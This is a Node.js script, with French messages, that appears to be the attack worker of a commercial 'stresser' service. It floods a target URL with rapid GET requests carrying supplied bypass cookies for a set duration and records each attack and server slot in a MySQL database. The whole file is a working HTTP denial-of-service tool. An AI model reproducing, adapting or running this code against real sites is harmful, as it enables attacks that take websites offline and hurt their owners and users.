var request = require('request');
var mysql = require('mysql');

var args = process.argv.slice(2);

let url="";
let cookies="";
let time=20;
let attaqueID=0;
if(!args[0] || args[0]==null){
	console.log("Veuillez indiquer une url de site web, une liste de cookies et une durée en secondes\nEx: node nooder-arg.js https://cyber-hub.pw \"NOODER_J=1515;NOODER_A=115....\"  durée(en sec) attaqueID");
	process.kill(0);
}
if(!args[1] || args[1]==null){
	console.log("Veuillez indiquer une url de site web, une liste de cookies et une durée en secondes\nEx: node nooder-arg.js https://cyber-hub.pw \"NOODER_J=1515;NOODER_A=115....\" durée(en sec) attaqueID");
	process.kill(0);
}
if(!args[2] || args[2]==null){
	console.log("Veuillez indiquer une url de site web, une liste de cookies et une durée en secondes\nEx: node nooder-arg.js https://cyber-hub.pw \"NOODER_J=1515;NOODER_A=115....\" durée(en sec) attaqueID");
	process.kill(0);
}
if(!args[3] || args[3]==null){
	console.log("Veuillez indiquer une url l'id de l'attaque dans la table attaques de la BDD\nEx: node nooder-arg.js https://cyber-hub.pw \"NOODER_J=1515;NOODER_A=115....\" durée(en sec) attaqueID");
	process.kill(0);
}

url=args[0];
cookies=args[1];
time=args[2];
attaqueID=args[3];


var connection = mysql.createConnection({
  	host     : 'localhost',
  	user     : 'root',
  	password : '',
 	database : 'stressing'
});

connection.connect(function(err) {
	if(err){
		console.log("ERREUR connexion à la BDD impossible !")
	} else {
		console.log("Connexion à la BDD effectuée !")
	}	
})

jsonContent = { "process": process.pid };
jsonContent = JSON.stringify(jsonContent)

connection.query("UPDATE `attaques` SET `content`=? WHERE `id`=?",[jsonContent, attaqueID]);

//Ne modifier QUEEEEE ça !
//let url = "https://free.nooooder.xyz/hit";
//let cookies = "NOODER_JE=8000905383601787486;NOODER_JA=1591518670; NOODER_JU=3219045247702073343; NOODER_JO=12313727963318309349"
//FIN DES MODIFICATIONSAUTORISEES

var options = {
    'method': 'GET',
    'url': url,
    'headers': {
        'Cookie': cookies
    },
    form: {

    }
};

var pause = 0;

setInterval(function(){
	pause=pause-1;
	if(time>0){
		time=time-1;
	} else {
		console.log("Attaque terminée");
		connection.query("UPDATE `attaques` SET `statut`=1 WHERE `id`=?",[attaqueID]);
		connection.query("SELECT `server` FROM `attaques` WHERE `id`=?",[attaqueID], function (err, result, fields) {
			if(!err){
				if(result.length != 0){
					let serverID = result[0].server;
					connection.query("UPDATE `servers` SET `active_concurent`=`active_concurent`-1 WHERE `id`=?", [serverID]);
					//connection.query("UPDATE `attaques` SET `statut`=1 WHERE `id`=?", [attaqueID]);
				}
			}
		})
		setTimeout(function() {
			process.kill(0);
		}, 1000)
	}
},1000)

setInterval(function(){
	if(pause <= 0){
		request(options, function (error, response) {
			if(error){
				console.log("Pause lancée");
				pause=2;
			} else {
				console.log("Ping envoyé");
			}
		});
	}
})